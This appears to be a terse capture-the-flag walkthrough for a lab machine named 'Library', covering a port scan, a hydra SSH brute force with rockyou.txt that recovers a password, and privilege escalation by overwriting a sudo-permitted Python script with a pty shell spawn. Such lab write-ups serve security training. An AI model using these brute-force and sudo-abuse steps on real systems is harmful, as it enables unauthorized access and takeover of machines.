# Library
```
EXPORT IP=10.10.253.227
```

## SCAN
```
22 SSH
80 HTTP 
```

## Credential
```
1. interesting ID
- http://10.10.253.227/#
- meliodas
```

## Ganing Access
```
1. hydra -l meliodas -P rockyou.txt EXPORT_IP ssh

2. password is "iloveyou1"
```


## Priviliege Escalate
```
: sudo -l
:   (ALL) NOPASSWD: /usr/bin/python* /home/meliodas/bak.py

1. rm -rf bak.py
2. echo "import pty;pty.spawn('/bin/sh')" > /home/meliodas/bak.py 
3. sudo python /home/meliodas/bak.py
```

# Done
